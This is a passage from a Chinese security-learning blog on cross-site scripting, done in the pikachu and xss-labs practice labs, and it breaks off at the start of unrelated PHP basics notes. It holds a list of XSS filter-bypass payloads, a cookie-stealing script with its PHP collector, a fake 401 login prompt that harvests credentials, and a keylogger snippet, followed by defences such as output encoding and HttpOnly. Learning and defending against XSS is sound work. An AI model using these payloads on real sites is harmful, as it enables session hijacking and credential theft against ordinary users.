<p>可见，XSS漏洞存在的要求就是：当前页面存在参数显示点，且参数显示点可被用户控制输入。因此，<strong>寻找用户端可控的输入点</strong>是XSS攻击成功的第一步。</p>
<blockquote>
<p>一般发生在留言板、在线信箱、评论栏等处，表现特征是用户可自行输入数据，并且数据会提交给服务器。通常可以通过观察页面的交互行为来确定输入点。通常情况下，要求可提交数据量至少在20字符以上，否则JavaScript脚本很难执行。在日常应用中，如留言板、在线信箱、评论栏等功能都允许用户输入100字左右，均能达到XSS攻击对允许输入字符的要求。</p>
</blockquote>
<p><strong>输入点位置</strong></p>
<blockquote>
<p>除了直接观察之外，利用Web代理工具抓包来查看提交参数也是寻找输入点的一个有效途径。在一些输入点隐蔽或者用户输入被JS脚本限制的页面，可以采用Brupsuite抓包的方式寻找输入点。通过直接抓取HTTP包，观察里面是否有隐藏参数，并且对隐藏参数在页面上进行定位，即可找到输入点位置。</p>
</blockquote>
<h6 id="2-测试输出位置"><a href="#2-测试输出位置" class="headerlink" title="2.测试输出位置"></a>2.测试输出位置</h6><p>测试主要基于两个目的：</p>
<p>1）确定网站对输入内容是否进行了输出，判断是否可以展开XSS攻击。</p>
<p>2）有时候需要根据输出的位置的HTML环境来编写有效的XSS代码。</p>
<p>一般留言板这些，输出位置很明显。</p>
<h6 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h6><p>如<strong>果不回显</strong>的话（内容可能不会在前台展示，或者需要一定的时间通过人工审核后才能展示）</p>
<p>除了凭借经验外，还可以尝试XSS攻击窃取Cookie，后台审核的一般是管理账户，若测试成功可能直接获得管理权限，但直接对管理员实施的XSS攻击也增加了<strong>被发现</strong>的风险。这也就是俗称的“<strong>XSS盲打后台</strong>”。</p>
<p>XSS盲打的目标功能点通常有：</p>
<blockquote>
<p>·留言板</p>
<p>·意见反馈点</p>
<p>·私信功能</p>
<p>·文件上传点中的信息输入框</p>
<p>·在线提交信息等</p>
</blockquote>
<p>XSS盲打的目标是找到输入点插入跨站代码，并且要求插入的代码由管理员在正常Web应用流程中触发。因此，<strong>如何寻找与管理员的“互动”成为关键点。</strong></p>
<p>该漏洞见pikachu靶场。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617002032118.png" alt="管理员登录后台查看留言板"></p>
<h6 id="3-测试基本跨站代码"><a href="#3-测试基本跨站代码" class="headerlink" title="3.测试基本跨站代码"></a>3.测试基本跨站代码</h6><p>测试XSS攻击的经典方式就是“弹窗测试”，即在输入中插入一段可以产生弹窗效果的JavaScript脚本，如果刷新页面产生了弹窗，表明XSS攻击测试成功。</p>
<p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，提交后，刷新页面，出现弹窗说明存在xss。</p>
<h4 id="2-绕过思路"><a href="#2-绕过思路" class="headerlink" title="2.绕过思路"></a>2.绕过思路</h4><p>以下只提供理论，实践请配合xss-labs靶场使用。</p>
<h5 id="1-闭合标签测试"><a href="#1-闭合标签测试" class="headerlink" title="1.闭合标签测试"></a>1.闭合标签测试</h5><p>利用查看网页源代码功能，如果内容输出在标签内。采取闭合方法。</p>
<h5 id="2-大小写混合测试"><a href="#2-大小写混合测试" class="headerlink" title="2.大小写混合测试"></a>2.大小写混合测试</h5><h5 id="3-多重嵌套测试"><a href="#3-多重嵌套测试" class="headerlink" title="3.多重嵌套测试"></a>3.多重嵌套测试</h5><p>顾名思义，如果&lt;script&gt;标签被自动删除，构造攻击代码为&lt;scr&lt;script&gt;ipt&gt;试试。</p>
<h5 id="4-宽字节绕过测试"><a href="#4-宽字节绕过测试" class="headerlink" title="4.宽字节绕过测试"></a>4.宽字节绕过测试</h5><p>如果目标服务器采取了黑名单+强制转换格式+多重嵌套过滤手段，那么仅通过对脚本中的关键词做基本变形已无法绕过防护机制。</p>
<p>后续的有效思路在于尝试提交的关键词绝对不能与黑名单中的关键词重合，也就是说，<strong>提交的参数应避免触发黑名单机制</strong>。这里会利用宽字节的测试手段。</p>
<h6 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h6><blockquote>
<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等都是常用的宽字节编码，这类编码方案在针对字符进行编码时利用两字节进行编码。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象</p>
</blockquote>
<h6 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h6><blockquote>
<p>GBK编码存在宽字节的问题，主要表现为GBK编码第一字节（高字节）的范围是0x81～0xFE，第二字节（低字节）的范围是0x40～0x7E与0x80～0xFE。GBK就是以这样的十六进制来针对字符进行编码。在GBK编码中，“\”符号的十六进制表示为0x5C，正好在GBK的低字节中。</p>
<p>如果在后面添加一个高字节编码，那么添加的高字节编码会与原有编码组合成一个合法字符。</p>
</blockquote>
<p>你要闭合，发现，引号等参数被转义了。</p>
<p>比如<code>&#39;;sdsdsd&#39;</code>结果为<strong>\‘;.</strong>..</p>
<p>而宽字节绕过为：</p>
<p><code>%bf&#39;;&lt;script&gt;alert(/xss/)&lt;/script&gt;;//</code></p>
<p>分析一下：</p>
<p>%bf在GBK编码的高字节范围，与后台转义单引号（’）生成的斜杠（\）相结合，正好组成了汉字“縗”的GBK编码，这个时候斜杠对单引号的转义效果便失效了，当然了，现在一般都采用utf-8，这种漏洞环境就少见了。</p>
<h5 id="5-多标签测试"><a href="#5-多标签测试" class="headerlink" title="5.多标签测试"></a>5.多标签测试</h5><p>能够触发弹窗效果的远不止&lt;script&gt;这一种标签</p>
<p>各类语法如下：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&quot;&gt;&lt;iframe src=http://XXX.XXX&gt;</span><br><span class="line">&gt;&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))</span><br><span class="line">&gt;//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//</span><br><span class="line">&gt;--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</span><br><span class="line">&gt;&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#x27;XSS&#x27;&quot;)`&gt;</span><br><span class="line">&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav??? ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&gt;&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&gt;&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#x27;\006a\0061\0076\0061\0073\0063\</span><br><span class="line">&gt;0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029&#x27;\</span><br><span class="line">&gt;0029&quot;&gt;</span><br><span class="line">&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&gt;%253cscript%253ealert(document.cookie)%253c/script%253e</span><br><span class="line">&gt;&#x27;; alert(document.cookie); var foo=&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>语句失效是难免的，主要是了解构造原理。</p>
<p>XSS语句的基本特点是利用各类JS脚本特性来设计触发点，攻击代码则可利用各类型编码或者外部引用方式进行加载。</p>
<blockquote>
<p>IE\Chrome\Firefox浏览器中的XSS Filter（针对XSS攻击的过滤器）包含语句非常全面。</p>
<p>过滤机制在于会<strong>提前识别</strong>post或get方法传递参数过滤中是否存在跨站代码，再根据服务器的响应包内容进行判断，如果存在则禁止显示。</p>
</blockquote>
<h4 id="3-测试总结"><a href="#3-测试总结" class="headerlink" title="3.测试总结"></a>3.测试总结</h4><p>学到了挖洞流程，在测试过程中，先判断漏洞存在的基本环境、条件，再构造XSS语句。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617001208515.png" alt="xss漏洞测试总结"></p>
<h3 id="8-利用方式"><a href="#8-利用方式" class="headerlink" title="8.利用方式"></a>8.利用方式</h3><p>弹窗测试只是用来证明XSS的存在，但远远不能说明XSS的危害。</p>
<p>但是OWASP TOP10多次把XSS威胁列在前位。</p>
<p>常见利用方式如下。</p>
<h5 id="1-窃取Cookie"><a href="#1-窃取Cookie" class="headerlink" title="1.窃取Cookie"></a>1.窃取Cookie</h5><blockquote>
<p>由于HTTP的特性，Cookie是目前Web系统识别用户身份和会话保存状态的主要方式。一旦应用程序中存在跨站脚本执行漏洞，那么攻击者就能利用XSS攻击轻而易举地获取被攻击者的Cookie信息，<strong>并伪装成当前用户登录，执行恶意操作等行为</strong>。</p>
<p>如果受害用户是管理员，那么攻击者甚至可以轻易地获取Web系统的管理权限。这类权限通常会有文件修改、上传，连接数据库等功能，再配合后续的攻击，会给当前Web应用安全带来很大的威胁。</p>
</blockquote>
<p>假设攻击者在一个常规运行的网站的留言板上发现了一个存储型的XSS漏洞，那么攻击者就可以使用下面的代码进行跨站攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://localhost:81/pikachu/vul/xss/xssblind/test.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当用户浏览到留言板上的这条信息时，浏览器会加载这段留言信息，从而触发了这个JS攻击脚本。攻击脚本便会读取该正常网站下的用户Cookie，并将Cookie作为参数以GET方式提交到攻击者的远程服务器<a href="http://www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：">www.xxx.com。在该远程服务器中，攻击者事先准备好了一个cookie.php放在Web根目录，代码如下：</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$log = fopen(&quot;../cookie.txt&quot;,&quot;a&quot;);//写了个目录路径</span><br><span class="line">Fwrite($log,$cookie.&quot;/n&quot;);</span><br><span class="line">Fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当有用户触发攻击时，攻击者服务器中的cookie.php便会接收受害者传入的Cookie，并保存在本地文件cookie.txt中。若Cookie还在有效期内，攻击者便可以利用该Cookie伪装成受害用户进行登录，进行非法操作。</p>
<p><strong>这里怎么触发呢？我按照要求在pikachu的xss盲打同目录下建立了test.php用来将cookie存起来，噢，代码就没有弹cookie嘞</strong></p>
<p>反射型可以，确实txt文件中添加到了。</p>
<h5 id="2-钓鱼攻击"><a href="#2-钓鱼攻击" class="headerlink" title="2.钓鱼攻击"></a>2.钓鱼攻击</h5><p>攻击者精心构造的跨站代码可以实现更多功能，诸如改变网站的前端页面、构造虚假的表单来诱导用户填写信息等。如果攻击者利用一个正规网站的XSS漏洞来伪造一个钓鱼页面，那么与传统的钓鱼网站相比，从客户端浏览器的地址栏看起来XSS伪造的钓鱼页面属于该正规网站，具有非常强的迷惑性。</p>
<blockquote>
<p>像以前的qq环境，有人给你私聊或者是空间留言，伴随了一个陌生链接，引起你的好奇心，点进了一个网址，这个网址居然是网页版的qq登录界面，登录进去后发现什么也没有。第二天，你的qq就出现异地登录了。</p>
</blockquote>
<h6 id="利用401认证实现用户信息钓鱼"><a href="#利用401认证实现用户信息钓鱼" class="headerlink" title="利用401认证实现用户信息钓鱼"></a>利用401认证实现用户信息钓鱼</h6><p>我以pikachu的存储性xss为例，达到的目的是，留言板上触发脚本，弹出认证窗口，输入的用户名和密码，再由另一个php文件保存。</p>
<p>首先写好一个auth.php文件，目的是认证窗口，要求用户重新输入用户名和密码，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">/* 检查变量 $PHP_AUTH_USER 和$PHP_AUTH_PW 的值*/</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line"><span class="comment">/* 空值：发送产生显示文本框的数据头部*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate:Basic realm=&quot;&#x27;</span>.<span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>])))&#123;</span><br><span class="line"><span class="comment">/* 变量值存在，检查其是否正确 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//结果发送给接收消息的后台</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://localhost:81/pikachu/vul/xss/xssblind/index.php?username=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_USER&#x27;]&#125;</span>&amp;password=<span class="subst">&#123;$_SERVER[&#x27;PHP_AUTH_PW&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其次，写一个index.php通过get()方式获取远端传输过来的账号和密码</p>
<p>当然了，为什么用GET。</p>
<p>凭据都是通过请求头部发送的，而不是通过请求体进行传递。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;	</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$referer</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="variable">$referer</span>.=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;D:/phpstudy_pro/WWW/pikachu/vul/xss/xssblind/user.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$username</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;+++++&quot;</span>.<span class="variable">$referer</span>.<span class="string">&quot;/n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一般是用数据库存储的，我这里用txt文件代替了。</p>
<p>现在去留言板输入xss语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://localhost:81/pikachu/vul/xss/xssblind/auth.php?id=yVCEB3&amp;info=input+your+account&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617102614829.png"></p>
<p>可惜，我反复停留在认证框，登录没法跳转。</p>
<p><strong>所以我的index.php貌似触发不了，嘶，没道理诶。</strong>(chrom和firefox都不行，之后再看吧)</p>
<p>当然了，以上php文件在pikachu的pkxss模块是有的，不需要自己写了。</p>
<p><a href="https://blog.csdn.net/weixin_44720762/article/details/89741520?ops_request_misc=%7B%22request_id%22:%22168696777416800225514033%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168696777416800225514033&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89741520-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA&spm=1018.2226.3001.4187"> XSS钓鱼攻击演示。_三块五的咸菜干的博客-CSDN博客</a></p>
<h5 id="3-窃取客户端信息"><a href="#3-窃取客户端信息" class="headerlink" title="3.窃取客户端信息"></a>3.窃取客户端信息</h5><p>通过使用JS脚本，攻击者可以获取用户浏览器访问记录、IP地址、开放端口、剪贴板内容、按键记录等许多敏感信息，并将其发送到自己的服务器保存下来。</p>
<h6 id="监听用户键盘动作"><a href="#监听用户键盘动作" class="headerlink" title="监听用户键盘动作"></a>监听用户键盘动作</h6><p>当用户在访问登录、注册、支付等页面时，在页面下的按键操作一般都是输入账号、密码等重要信息。如果攻击者在这些页面构造了跨站攻击脚本，便可记录用户的按键信息，并将信息传输到自己的远程服务器，那么用户的密码等资料便发生了泄漏。此处为了更好地演示效果，将监听到的用户按键直接采用网页弹窗弹出。构造的跨站代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var realkey = String.fromCharCode(event.keyCode);</span><br><span class="line">alert(realkey);&#125;</span><br><span class="line">document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>还是提交到留言板上后，弹窗显示对应按键</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142543519.png" alt="按键监听"></p>
<p>如果和钓鱼一样，把按键监听结果发送到远程服务器，啧啧。</p>
<h3 id="9-标准防护方法"><a href="#9-标准防护方法" class="headerlink" title="9.标准防护方法"></a>9.标准防护方法</h3><p>已知XSS的原理就是：注入一段能够被浏览器解释执行的代码，并且通过各类手段使得这段代码“镶嵌”在正常网页中，由用户在正常访问中触发。</p>
<p>防御的困难点在于：</p>
<p>1.web浏览器本身就有很多安全问题，而浏览器又是xss的攻击主战场</p>
<p>2.web应用程序有广泛的输入&#x2F;输出交互点</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230617142906722.png" alt="xss攻防流程图"></p>
<p>虽然有过滤特殊字符代码，但还是存在一些绕过方式。</p>
<h4 id="过滤特殊字符的绕过"><a href="#过滤特殊字符的绕过" class="headerlink" title="过滤特殊字符的绕过"></a>过滤特殊字符的绕过</h4><p>1.href属性中的伪协议</p>
<p>&lt;a&gt;标签中利用href属性，在用户传入的参数前面加上http:&#x2F;&#x2F;来构成URL。但如果可成功利用传入的参数构造语句为“&lt;a href&#x3D;javascript：alert（’&#x2F;a&#x2F;‘）&gt;adas&lt;&#x2F;a&gt;”，则与直接执行javascript：alert（’&#x2F;a&#x2F;‘）的效果完全相同。</p>
<p>如果冒号被过滤了：</p>
<p>2.利用HTML实体化编码绕过过滤脚本</p>
<p>将“javascript”中的字符“s”进行了实体化编码，对应的HTML实体化编码为&amp;#x73；</p>
<p>3.HTML5新增标签</p>
<p>对于黑名单可以寻找没有过滤的标签，如&lt;math&gt;标签的利用(firefox)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;math&gt;</span><br><span class="line">&lt;maction xlink:href=&quot;javascript:alert(/xss/)&quot;&gt;hello world&lt;/maction&gt;</span><br><span class="line">&lt;/math&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>

<h4 id="使用实体化编码防御"><a href="#使用实体化编码防御" class="headerlink" title="使用实体化编码防御"></a>使用实体化编码防御</h4><p>有了这些特殊符号，攻击者就可以肆意地进行闭合标签、篡改页面、提交请求等行为。在输出内容之前，如果能够对特殊字符进行编码和转义，让浏览器能知道这些字符是被用作文字显示而不是作为代码执行，就会使攻击代码无法被浏览器执行。编码的方式有很多种，每种都适应于不同的环境。下面介绍两种常见的安全编码。</p>
<p>1.HTML编码</p>
<blockquote>
<p>在PHP中，可以使用htmlspecialchars（）来进行编码，HTML是替换编码，告知浏览器哪些特殊字符只能作为文本显示，不能当作代码执行。从而规避了XSS风险。</p>
</blockquote>
<p>2.JavaScript编码</p>
<blockquote>
<p>用户的输入信息有时候会被嵌入JavaScript代码块中，也就是添加”\“进行了转义</p>
</blockquote>
<h4 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h4><p>是Cookie的一项属性。如果一个Cookie值设置了这个属性，那么浏览器将禁止页面的JavaScript访问这个Cookie。窃取用户Cookie是攻击者利用XSS漏洞进行攻击的主要方式之一，如果JS脚本不具备读取Cookie的权限，那窃取用户Cookie的这项攻击也就宣告失败了。</p>
<p>但这只是一个防止Cookie被恶意读取的设置，仅仅可阻碍跨站攻击行为偷取当前用户的Cookie信息，并没有从根本上解决XSS的问题。可以搭配以上措施使用。</p>
<p>在PHP下开启HttpOnly的方式如下：</p>
<p>1）找到PHP.ini，寻找并开启标签session.cookie_httponly&#x3D;true，从而开启全局的Cookie的HttpOnly属性。</p>
<p>2）Cookie操作函数setcookie和setrawcookie专门添加了第7个参数来作为HttpOnly的选项，开启方法为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br><span class="line">setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE);</span><br></pre></td></tr></table></figure>



<p>在实际应用中，HttpOnly没有被广泛使用，这是从业务便利性角度进行的选择。比如，在网站做广告推荐时，会利用JS脚本读取当前用户Cookie信息以作精准推广，如果开启HttpOnly，则上述效果会失效。</p>
<h3 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h3><p>了解了xss的原理、条件、利用方式、绕过方式。</p>
<p>XSS漏洞的核心问题在于当前页面<strong>没有明确区分用户参数与代码</strong>，导致由客户端提交的恶意代码会回显给客户端并且执行。</p>
<p><strong>解决XSS漏洞的基本思路是过滤+实体化编码</strong>。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>xss</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>php语言基础</title>
    <url>/2023/05/31/php/</url>
    <content><![CDATA[<h1 id="一-基础"><a href="#一-基础" class="headerlink" title="一.基础"></a>一.基础</h1><h2 id="1-变量分类"><a href="#1-变量分类" class="headerlink" title="1.变量分类"></a>1.变量分类</h2><h3 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.可变变量"></a>1.可变变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<span class="comment">//编码设置</span></span><br><span class="line"><span class="variable">$bao</span>=<span class="string">&#x27;biao&#x27;</span>;</span><br><span class="line"><span class="variable">$biao</span>=<span class="string">&#x27;鼠标&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$bao</span>.<span class="string">&quot;///&quot;</span>.<span class="variable">$$bao</span>; <span class="comment">//$$bao即可变变量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果为:biao&#x2F;&#x2F;&#x2F;鼠标</p>
<h3 id="2-外部变量"><a href="#2-外部变量" class="headerlink" title="2.外部变量"></a>2.外部变量</h3><p>即php在使用过程中规定好的一些变量。</p>
<p>在html文件中写入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;lx2.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;passwrod&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在php文件中写入</p>
